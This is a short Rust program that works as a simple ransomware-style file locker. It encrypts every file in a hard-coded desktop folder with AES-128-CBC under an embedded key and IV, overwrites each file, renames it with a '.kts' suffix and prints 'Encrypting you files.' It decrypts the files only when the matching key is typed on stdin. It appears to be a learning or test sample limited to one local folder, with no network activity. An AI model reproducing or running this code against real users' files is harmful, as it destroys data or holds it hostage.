use std::{fs, io::{self, Read}};
use text_colorizer::*;
use libaes::Cipher;

const KEY: &[u8; 16] = b"z5BGSs1r5i5mb3ra";
const IV: &[u8; 16] = b"9ApZbq8TY6wPOmAe";

fn checker(entry: &fs::DirEntry) -> bool {
    if let Some(extension) = entry.path().extension() {
        return extension.to_os_string() == "kts"
    }
    false
}

fn encrypt(file_name: &str) {
    let cipher = Cipher::new_128(KEY);

    println!("{} Encrypting you files.", "[+]".red().bold());
    let encrypted = cipher.cbc_encrypt(IV, &fs::read(file_name).unwrap());
    let _ = fs::write(file_name, encrypted);
    let new_filename = format!("{}.kts", file_name);
    let _ = fs::rename(file_name, new_filename);
}

fn decrypt(file_name: &str, pass: &[u8; 16]) {
    let cipher = Cipher::new_128(&pass);

    println!("{} Decrypting you files.", "[+]".green().bold());
    let decrypted = cipher.cbc_decrypt(IV, &fs::read(file_name).unwrap());
    let _ = fs::write(file_name, decrypted);
    let new_filename = file_name.replace(".kts", "");
    let _ = fs::rename(file_name, new_filename);
}

fn main() {
    let path = "/home/katashi/Desktop/exemplo";
    let mut pass: Option<[u8; 16]> = None;

    if let Ok(entries) = fs::read_dir(path) {
        for entry in entries {
            if let Ok(entry) = entry {
                let file_name = entry.path();
                if checker(&entry) {
                    if pass.is_none() {
                        let mut pass_input: [u8; 16] = [0; 16];
                        if let Ok(_) = io::stdin().read_exact(&mut pass_input) {
                            if &pass_input != KEY {
                                println!("{} Wrong key. Exiting.", "[-]".red().bold());
                                std::process::exit(1);
                            }
                            pass = Some(pass_input);
                        } else {
                            println!("{} No password provided. Exiting.", "[-]".red().bold());
                            std::process::exit(1);
                        }
                    }
                    if let Some(pass) = pass {
                        decrypt(&file_name.to_string_lossy(), &pass);
                    }
                } else {
                    encrypt(&file_name.to_string_lossy());
                }
            }
        }
    }    
}
